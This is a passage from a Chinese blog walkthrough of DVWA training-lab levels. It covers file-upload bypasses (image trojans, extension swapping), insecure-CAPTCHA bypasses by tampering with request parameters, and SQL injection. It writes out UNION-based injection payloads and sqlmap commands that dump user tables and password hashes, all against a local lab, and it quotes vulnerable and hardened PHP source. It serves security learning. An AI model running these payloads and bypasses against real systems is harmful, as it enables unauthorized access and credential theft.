+<p>但实际访问的是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211021371.png" alt="image-20240521102100331"></p>
+<p>表示上传成功</p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211022578.png" alt="image-20240521102237537"></p>
+<p>没什么限制</p>
+
+        <h2 id="Medium-4"   >
+          <a href="#Medium-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211023786.png" alt="image-20240521102321755"></p>
+<p>限制了上传的文件必须是图片类型，并且小于100000</p>
+<p>那就更改文件后缀为.jpg，上传并抓包，然后将文件后缀修改为.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029661.png" alt="image-20240521102917633"></p>
+<p>发送后可以看到文件成功上传</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029463.png" alt="image-20240521102948439"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211031549.png" alt="image-20240521103119521"></p>
+
+        <h2 id="High-4"   >
+          <a href="#High-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-4" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211032344.png" alt="image-20240521103253304"></p>
+<p>新增了使用<code>getimagesize()</code> 函数尝试获取图像的大小信息。如果文件是一个有效的图像，该函数会成功返回图像的尺寸信息；如果不是，返回 <code>false</code>。</p>
+<p>需要制作一个图片马</p>
+<p>方法：</p>
+<p>将一个本来的图片文件用Notepad++打开，在后面添加一句话木马(phpinfo())</p>
+<p>上传成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212153165.png" alt="image-20240521215335115"></p>
+<p>用文件包含里的打开</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212152876.png" alt="image-20240521215252769"></p>
+
+        <h2 id="Impossible-4"   >
+          <a href="#Impossible-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211103883.png" alt="image-20240521110317819"></p>
+<p>调用 <code>checkToken</code> 函数来验证 CSRF 令牌的有效性，防止跨站请求伪造攻击，并且末尾调用 <code>generateSessionToken()</code> 函数来生成新的 CSRF 令牌，准备下一次请求。</p>
+<p>使用 <code>md5</code> 函数和 <code>uniqid</code> 函数生成基于上传文件名称的唯一文件名，以避免文件名冲突或敏感信息泄露。</p>
+<p>使用<code>imagecreatefromjpeg</code> 和 <code>imagecreatefrompng</code>去除任何潜在的恶意元数据，代码对图像进行了重新编码。</p>
+<p>如果存在临时文件，则使用 <code>unlink</code> 删除</p>
+
+        <h1 id="六、不安全的验证码"   >
+          <a href="#六、不安全的验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、不安全的验证码" class="headerlink" title="六、不安全的验证码"></a>六、不安全的验证码</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241049477.png" alt="image-20240524104922436"></p>
+
+        <h2 id="Low-5"   >
+          <a href="#Low-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2>
+      <p>查看关键源代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;1&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27;],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // Show next stage for the user</span><br><span class="line">            echo &quot;</span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Both new passwords do not match.</span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;2&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check to see if both password match</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with the passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>步骤分为两步，第一步输入两次密码后验证CAPTCH是否通过，如果两次密码一样并且通过验证，则提示按按钮来确认，于是来到第二步，更新密码</p>
+<p>修改密码时需要验证是否是真人</p>
+<p>抓包看看，可以看到我现在正处于第一步，并且有g-recaptcha-response参数，用于验证用户的交互以确认他们是真实的用户而非自动化脚本或机器人</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241039323.png" alt="image-20240524103938205"></p>
+<p>那么我们直接跳过这一步，将step值改为2再发送</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042392.png" alt="image-20240524104256356"></p>
+<p>成功修改密码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042729.png" alt="image-20240524104236685"></p>
+
+        <h2 id="Medium-5"   >
+          <a href="#Medium-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241055812.png" alt="image-20240524105545774"></p>
+<p>第二步中新增了检查 POST 请求中 <code>passed_captcha</code> 参数是否为True</p>
+<p>抓包修改step的值为2，并且增加一个<code>passed_captcha</code> 参数，值为true</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241106627.png" alt="image-20240524110624587"></p>
+<p>发送，修改成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241108352.png" alt="image-20240524110825309"></p>
+
+        <h2 id="High-5"   >
+          <a href="#High-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-5" class="headerlink" title="High"></a>High</h2>
+      <p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241122687.png" alt="image-20240524112233649"></p>
+<p>检查 POST 数据中，<code>g-recaptcha-response</code> 字段是否等于 <code>&#39;hidd3n_valu3&#39;</code>，检查User-Agent是否被设置为 <code>&#39;reCAPTCHA&#39;</code>，并且取消了第二步</p>
+<p>所以抓包修改<code>g-recaptcha-response</code> 的值为 <code>hidd3n_valu3</code>，User-Agent值为reCAPTCHA</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125526.png" alt="image-20240524112524481"></p>
+<p>发送，修改成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125100.png" alt="image-20240524112537064"></p>
+
+        <h2 id="Impossible-5"   >
+          <a href="#Impossible-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p>查看源代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &#x27;password_current&#x27; ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27; ],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct?</span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">            // Update the database</span><br><span class="line">            $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success!</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Feedback for the end user - failed!</span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>检查 Anti-CSRF 令牌，验证用户会话中的 CSRF 令牌是否有效，以防止 CSRF 攻击</p>
+<p>用户输入的新密码和确认密码都通过 <code>stripslashes</code> 和 <code>mysqli_real_escape_string</code> 处理以防止 SQL 注入，并使用 MD5 进行加密</p>
+<p>并且还会检查当前密码是否正确，并使用预处理语句查询数据库验证当前密码</p>
+
+        <h1 id="SQL注入"   >
+          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
+      
+        <h2 id="Low-6"   >
+          <a href="#Low-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211513362.png" alt="image-20240521151351307"></p>
+
+        <h3 id="手工注入"   >
+          <a href="#手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3>
+      
+        <h4 id="首先判断是否存在注入且注入类型"   >
+          <a href="#首先判断是否存在注入且注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#首先判断是否存在注入且注入类型" class="headerlink" title="首先判断是否存在注入且注入类型"></a>首先判断是否存在注入且注入类型</h4>
+      <p>输入一个数字1，查询成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211514062.png" alt="image-20240521151423024"></p>
+<p>输入1’，返回错误，说明存在SQL注入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211515222.png" alt="image-20240521151510181"></p>
+<p>再试试1’or ‘1’=’1，查询成功，说明是字符型注入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211516022.png" alt="image-20240521151620992"></p>
+
+        <h4 id="查看列数"   >
+          <a href="#查看列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br><span class="line">&#x27; union select 1,2,3;#</span><br></pre></td></tr></table></div></figure>
+
+<p>依次尝试，发现只有两列</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211522744.png" alt="image-20240521152233711"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211523383.png" alt="image-20240521152307352"></p>
+
+        <h4 id="获取当前数据库"   >
+          <a href="#获取当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>
+
+<p>发现数据库名称为dvwa </p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211549055.png" alt="image-20240521154916026"></p>
+
+        <h4 id="获取数据表名"   >
+          <a href="#获取数据表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211550951.png" alt="image-20240521155037919"></p>
+
+        <h4 id="查看表字段名"   >
+          <a href="#查看表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211552757.png" alt="image-20240521155230718"></p>
+<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
+
+        <h4 id="查看字段内容"   >
+          <a href="#查看字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看的users表中所有用户的user、password的数据</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211556881.png" alt="image-20240521155658847"></p>
+
+        <h3 id="Sqlmap"   >
+          <a href="#Sqlmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
+      
+        <h4 id="获取当前数据库-1"   >
+          <a href="#获取当前数据库-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241330520.png" alt="image-20240524133052476"></p>
+
+        <h4 id="获取数据库表名"   >
+          <a href="#获取数据库表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241331421.png" alt="image-20240524133140382"></p>
+
+        <h4 id="查看表字段名-1"   >
+          <a href="#查看表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-1" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241332189.png" alt="image-20240524133224149"></p>
+
+        <h4 id="查看字段内容-1"   >
+          <a href="#查看字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-1" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241333134.png" alt="image-20240524133321086"></p>
+<p>查看源代码发现对输入没有什么限制</p>
+
+        <h2 id="Medium-6"   >
+          <a href="#Medium-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211600670.png" alt="image-20240521160040637"></p>
+<p>界面上只能下拉来改变输入</p>
+<p>尝试使用HackBar来用POST方法提交数据</p>
+
+        <h4 id="判断注入类型"   >
+          <a href="#判断注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
+      <p>输入1，页面能正常返回查询到的数据</p>
+<p>有&amp;Submit=Submit的原因：网页基于检测特定的提交按钮来触发相应的数据库操作或其他逻辑的。如果不包括这个参数，服务器端的脚本可能不会执行期望的操作</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211636361.png" alt="image-20240521163641322"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211637282.png" alt="image-20240521163715255"></p>
+<p>输入1’or ‘1’=’1，报错</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211641567.png" alt="image-20240521164115536"></p>
+<p>输入1 or 1 = 1，返回了所有数据，说明是数字型注入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211642588.png" alt="image-20240521164209548"></p>
+
+        <h4 id="查看列数-1"   >
